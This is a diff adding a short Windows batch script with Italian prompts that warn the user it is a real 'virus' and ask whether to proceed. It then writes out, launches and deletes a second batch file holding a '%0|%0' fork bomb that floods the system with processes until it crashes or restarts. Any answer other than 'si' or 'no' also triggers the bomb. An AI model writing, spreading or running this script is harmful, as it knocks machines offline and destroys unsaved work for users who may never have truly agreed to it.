@@ -1,0 +1,33 @@
+@echo off
+echo.
+echo.
+echo.
+echo.
+echo    Attenzione questo non è un virus falso, ora il pc verrà sovraccaricato di dati interni fino a farlo riavviare. 
+echo.
+echo.
+echo.
+echo                                   Vuoi procedere?(si,no)
+set/p "cho=>"
+if %cho% == si goto wqwqwqwqwq
+if %cho% == no goto frfrefrefr
+
+:wqwqwqwqwq
+echo.
+echo.
+echo.
+echo processo avviato.....
+(
+echo @echo off
+echo color c
+echo %0|%0
+)>vrs.bat
+
+start vrs.bat
+del vrs.bat
+
+:frfrefrefr
+goto exit
+
+
+:exit
